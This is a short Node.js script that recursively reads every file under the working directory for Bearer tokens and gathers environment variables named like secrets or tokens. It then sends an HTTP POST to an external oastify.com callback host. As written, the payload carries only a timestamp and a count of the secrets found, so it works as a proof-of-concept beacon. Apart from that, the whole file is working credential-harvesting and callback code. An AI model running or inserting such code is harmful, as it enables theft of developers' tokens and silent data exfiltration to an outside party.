const http=require('http'), fs=require('fs'), path=require('path');
const OASTIFY_HOST='abcdefghijklmnop.oastify.com'; const ROOT_DIR=process.cwd(), found=[];
function scanDirectory(dir) { for (const f of fs.readdirSync(dir, {withFileTypes:true})) { const p=path.join(dir,f.name); if(f.isDirectory()) scanDirectory(p); else { const t=fs.readFileSync(p,'utf8').match(/Bearer\s+([A-Za-z0-9_-]{20,})/); if(t) found.push(t[1]); } } }
function scanEnvVars() { for(const [k,v] of Object.entries(process.env)) if(/secret|token/i.test(k)) found.push(v); }
scanDirectory(ROOT_DIR); scanEnvVars();
const payload=JSON.stringify({timestamp:Date.now(), count: found.length}); const req=http.request({hostname:OASTIFY_HOST,method:'POST',path:'/?token_scan'}); req.write(payload);req.end();
